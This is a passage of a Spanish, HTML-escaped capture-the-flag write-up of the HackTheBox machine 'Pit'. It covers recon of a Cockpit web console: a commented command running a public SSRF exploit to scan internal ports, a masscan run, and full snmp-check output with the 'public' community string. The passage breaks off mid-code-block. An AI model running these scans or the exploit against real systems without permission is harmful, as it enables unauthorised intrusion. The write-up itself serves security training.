&lt;h1 id=&#34;cockpit&#34;&gt;COCKPIT&lt;/h1&gt;
&lt;p&gt;En el puerto 9090/https encontramos un login de lo que parecia ser CentOS, al investigar, encontramos que &lt;a href=&#34;https://cockpit-project.org/&#34;&gt;cockpit&lt;/a&gt; es una interfaz web para el manejo de servidores.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/pit/Screenshot_20210519_221517.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;exploit&#34;&gt;Exploit&lt;/h2&gt;
&lt;p&gt;Aparentemente Cockpit tiene una vulnerabilidad &lt;a href=&#34;https://www.exploit-db.com/exploits/49397&#34;&gt;SSRF (Unauthenticated)&lt;/a&gt; con la cual se pueden detectar &lt;a href=&#34;https://github.com/cockpit-project/cockpit/issues/15077&#34;&gt;puertos abiertos&lt;/a&gt;, tras ejecutar el exploit encontramos el puerto 22 con un tipo de respuesta de autorizacion, intentamos autorizar nuestra direccion IP pero encontramos que el host por default para &lt;a href=&#34;https://github.com/cockpit-project/cockpit/blob/master/doc/authentication.md#remote-machines&#34;&gt;ingresar&lt;/a&gt; es &lt;code&gt;127.0.0.1&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# python3 SSRF_cockpit_234.py --target pit.htb:9090 --scan localhost --ports [...]&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# portRange = list(range(23,1024))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/pit/Screenshot_20210519_223504.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;snmp&#34;&gt;Snmp&lt;/h1&gt;
&lt;p&gt;Despues de intentar varias cosas en cockpit realizamos nuevamente un escaneo de puertos utilizando masscan donde se incluyeron los puertos UDP.&lt;/p&gt;
&lt;h2 id=&#34;masscan&#34;&gt;Masscan&lt;/h2&gt;
&lt;p&gt;Tras finalizar se mostraron los mismos puertos que con nmap, con la excepcion de el puerto UDP 161 (snmp).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;π ~/htb/pit/tmp ❯ sudo masscan -p1-65535,U:1-65535 10.10.10.241 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0
Starting masscan 1.3.2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2021-05-20 03:47:49 GMT
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 22/tcp on 10.10.10.241
Discovered open port 9090/tcp on 10.10.10.241
Discovered open port 80/tcp on 10.10.10.241
Discovered open port 161/udp on 10.10.10.24
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;setup&#34;&gt;Setup&lt;/h2&gt;
&lt;p&gt;Antes de realizar cualquier solicitud con herramientas para snmp se realizó la instalacion del packete de &lt;code&gt;MIBs&lt;/code&gt;, ya que en las solicitudes solamente se muestran los &lt;code&gt;OIDs&lt;/code&gt;. Asi mismo se comento en el archivo &lt;code&gt;snmp.conf&lt;/code&gt; la linea &lt;code&gt;mibs :&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# sudo apt-get install snmp #if necessary&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# sudo apt-get install snmp-mibs-downloader&lt;/span&gt;
π ~/htb/pit ❯ ll /etc/snmp/snmp.conf
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;511&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:22 /etc/snmp/snmp.conf
π ~/htb/pit ❯ cat /etc/snmp/snmp.conf&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep -v &lt;span class=&#34;s2&#34;&gt;&amp;#34;#&amp;#34;&lt;/span&gt;

mibs :
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://nsrc.org/workshops/2016/walc/gestion/exercises/ejercicios-snmp.htm#instalaci%C3%B3n-del-los-programas-de-gestion-del-cliente&#34;&gt;snmp - client&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;snmp-check&#34;&gt;Snmp Check&lt;/h2&gt;
&lt;p&gt;Utilizamos &lt;code&gt;snmp-check&lt;/code&gt;, no mostró mucho, más que algunos procesos e informacion del sistema, utilizando: &lt;code&gt;&amp;quot;community: public, version: 2c&amp;quot;&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/pit/tmp ❯ snmp-check -v 2c -c public 10.10.10.241
snmp-check v1.9 - SNMP enumerator
Copyright &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 2005-2015 by Matteo Cantoni &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;www.nothink.org&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Try to connect to 10.10.10.241:161 using SNMPv2c and community &lt;span class=&#34;s1&#34;&gt;&amp;#39;public&amp;#39;&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; System information:

  Host IP address               : 10.10.10.241
  Hostname                      : pit.htb
  Description                   : Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 &lt;span class=&#34;c1&#34;&gt;#1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64&lt;/span&gt;
  Contact                       : Root &amp;lt;root@localhost&amp;gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;configure /etc/snmp/snmp.local.conf&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  Location                      : Unknown &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;edit /etc/snmp/snmpd.conf&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  Uptime snmp                   : 00:24:07.24
  Uptime system                 : 00:23:23.02
  System date                   : -

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Network information:

  Default TTL                   : noSuchObject
  TCP segments received         : noSuchObject
  TCP segments sent             : noSuchObject
  TCP segments retrans          : noSuchObject
  Input datagrams               : noSuchObject
  Delivered datagrams           : noSuchObject
  Output datagrams              : noSuchObject

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Processes:

  Id                    Status                Name                  Path                  Parameters
  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;                     runnable              systemd               /usr/lib/systemd/systemd  --switched-root --system --deserialize &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt;
  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;                     runnable              kthreadd
  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
  &lt;span class=&#34;m&#34;&gt;992&lt;/span&gt;                   runnable              auditd                /sbin/auditd
  &lt;span class=&#34;m&#34;&gt;994&lt;/span&gt;                   runnable              sedispatch            /usr/sbin/sedispatch
  &lt;span class=&#34;m&#34;&gt;1026&lt;/span&gt;                  runnable              polkitd               /usr/lib/polkit-1/polkitd  --no-debug
  &lt;span class=&#34;m&#34;&gt;1028&lt;/span&gt;                  runnable              VGAuthService         /usr/bin/VGAuthService  -s
  &lt;span class=&#34;m&#34;&gt;1029&lt;/span&gt;                  runnable              vmtoolsd              /usr/bin/vmtoolsd
  &lt;span class=&#34;m&#34;&gt;1030&lt;/span&gt;                  runnable              dbus-daemon           /usr/bin/dbus-daemon  --system --address&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;systemd: --nofork --nopidfile --systemd-activation --syslog-only
  &lt;span class=&#34;m&#34;&gt;1032&lt;/span&gt;                  runnable              irqbalance            /usr/sbin/irqbalance  --foreground
  &lt;span class=&#34;m&#34;&gt;1034&lt;/span&gt;                  runnable              sssd                  /usr/sbin/sssd        -i --logger&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;files
  &lt;span class=&#34;m&#34;&gt;1039&lt;/span&gt;                  runnable              chronyd               /usr/sbin/chronyd
  &lt;span class=&#34;m&#34;&gt;1050&lt;/span&gt;                  runnable              rngd                  /sbin/rngd            -f --fill-watermark&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
  &lt;span class=&#34;m&#34;&gt;1069&lt;/span&gt;                  runnable              sssd_be               /usr/libexec/sssd/sssd_be  --domain implicit_files --uid &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; --gid &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; --logger&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;files
  &lt;span class=&#34;m&#34;&gt;1077&lt;/span&gt;                  runnable              sssd_nss              /usr/libexec/sssd/sssd_nss  --uid &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; --gid &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; --logger&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;files
  &lt;span class=&#34;m&#34;&gt;1079&lt;/span&gt;                  runnable              firewalld             /usr/libexec/platform-python  -s /usr/sbin/firewalld --nofork --nopid
  &lt;span class=&#34;m&#34;&gt;1094&lt;/span&gt;                  runnable              systemd-logind        /usr/lib/systemd/systemd-logind
  &lt;span class=&#34;m&#34;&gt;1118&lt;/span&gt;                  runnable              NetworkManager        /usr/sbin/NetworkManager  --no-daemon
  &lt;span class=&#34;m&#34;&gt;1129&lt;/span&gt;                  runnable              tuned                 /usr/libexec/platform-python  -Es /usr/sbin/tuned -l -P
  &lt;span class=&#34;m&#34;&gt;1132&lt;/span&gt;                  runnable              sshd                  /usr/sbin/sshd        -D -oCiphers&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128
  &lt;span class=&#34;m&#34;&gt;1169&lt;/span&gt;                  runnable              crond                 /usr/sbin/crond       -n
  &lt;span class=&#34;m&#34;&gt;1170&lt;/span&gt;                  unknown               kworker/1:5-cgroup_pidlist_destroy
  &lt;span class=&#34;m&#34;&gt;1181&lt;/span&gt;                  runnable              agetty                /sbin/agetty          -o -p -- &lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt; --noclear tty1 linux
  &lt;span class=&#34;m&#34;&gt;1228&lt;/span&gt;                  runnable              mysqld                /usr/libexec/mysqld   --basedir&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr
  &lt;span class=&#34;m&#34;&gt;1235&lt;/span&gt;                  runnable              nginx                 nginx: master process /usr/sbin/nginx
  &lt;span class=&#34;m&#34;&gt;1236&lt;/span&gt;                  runnable              nginx                 nginx: worker process
  &lt;span class=&#34;m&#34;&gt;1237&lt;/span&gt;                  runnable              nginx                 nginx: worker process
  &lt;span class=&#34;m&#34;&gt;1508&lt;/span&gt;                  running               snmpd                 /usr/sbin/snmpd       -LS0-6d -f
  &lt;span class=&#34;m&#34;&gt;1510&lt;/span&gt;                  runnable              rsyslogd              /usr/sbin/rsyslogd    -n
  &lt;span class=&#34;m&#34;&gt;1693&lt;/span&gt;                  unknown               kworker/0:0-events
  &lt;span class=&#34;m&#34;&gt;1707&lt;/span&gt;                  running               kworker/1:1-events
  &lt;span class=&#34;m&#34;&gt;1800&lt;/span&gt;                  unknown               kworker/0:2-events
  &lt;span class=&#34;m&#34;&gt;1807&lt;/span&gt;                  unknown               kworker/1:2-events
  &lt;span class=&#34;m&#34;&gt;1845&lt;/span&gt;                  runnable              php-fpm               php-fpm: master process &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;/etc/php-fpm.conf&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  &lt;span class=&#34;m&#34;&gt;1846&lt;/span&gt;                  runnable              php-fpm               php-fpm: pool www
  &lt;span class=&#34;m&#34;&gt;1847&lt;/span&gt;                  runnable              php-fpm               php-fpm: pool www
  &lt;span class=&#34;m&#34;&gt;1848&lt;/span&gt;                  runnable              php-fpm               php-fpm: pool www
  &lt;span class=&#34;m&#34;&gt;1849&lt;/span&gt;                  runnable              php-fpm               php-fpm: pool www
  &lt;span class=&#34;m&#34;&gt;1850&lt;/span&gt;                  runnable              php-fpm               php-fpm: pool www
  &lt;span class=&#34;m&#34;&gt;1854&lt;/span&gt;                  unknown               kworker/u4:0-flush-253:0
  &lt;span class=&#34;m&#34;&gt;1858&lt;/span&gt;                  unknown               kworker/1:4-cgroup_destroy

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; File system information:

  Index                         : noSuchObject
  Mount point                   : noSuchObject
  Access                        : noSuchObject
  Bootable                      : noSuchObject
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;snmap-walk&#34;&gt;Snmap Walk&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;snmp-walk&lt;/code&gt; de igual forma mostró la misma informacion que &lt;code&gt;snmp-check&lt;/code&gt;, aunque con esta herramienta es posible obtener informacion de &lt;a href=&#34;http://net-snmp.sourceforge.net/wiki/index.php/TUT:snmpwalk#Basic_Example&#34;&gt;más de un grupo&lt;/a&gt; por lo que utilizamos &lt;code&gt;.iso&lt;/code&gt; o &lt;code&gt;.1.3&lt;/code&gt; al final del comando para que se muestre más informacion. Además encontramos tambien un post sobre &lt;a href=&#34;https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sect-system_monitoring_tools-net-snmp-extending&#34;&gt;nsExtendObjects&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Inicialmente se analizó el output para analizar los diferentes &amp;ldquo;querys&amp;rdquo; para &amp;ldquo;ordenar&amp;rdquo; y &amp;ldquo;obtener más&amp;rdquo; informacion, vemos informacion del disco, informacion del sistema, algunos usuarios, roles y comando, aunque este ultimo no muestra ningun tipo de log de ejecucion.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;87
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
